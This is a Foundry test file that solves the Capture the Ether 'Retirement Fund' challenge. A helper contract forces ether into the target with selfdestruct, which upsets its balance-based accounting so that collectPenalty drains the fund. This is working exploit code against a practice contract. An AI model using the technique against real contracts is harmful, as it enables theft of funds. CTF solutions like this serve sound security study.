pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/capture-the-ether/RetirementFund.sol";

contract MiddleMan {
    function attack(address prey) external payable {
        selfdestruct(payable(prey));
    }
}

// selfdestruct to send eth to the contract to make withdrawn > 0
contract RetirementFundTest is Test {
    RetirementFund instance;

    receive() external payable {}

    function setUp() public {
        instance = new RetirementFund{value: 1 ether}(address(this));
    }

    function test() public {
        assertFalse(instance.isComplete());

        MiddleMan middleMan = new MiddleMan();

        middleMan.attack{value: 0.001 ether}(address(instance));
        instance.collectPenalty();

        assertTrue(instance.isComplete());
    }
}
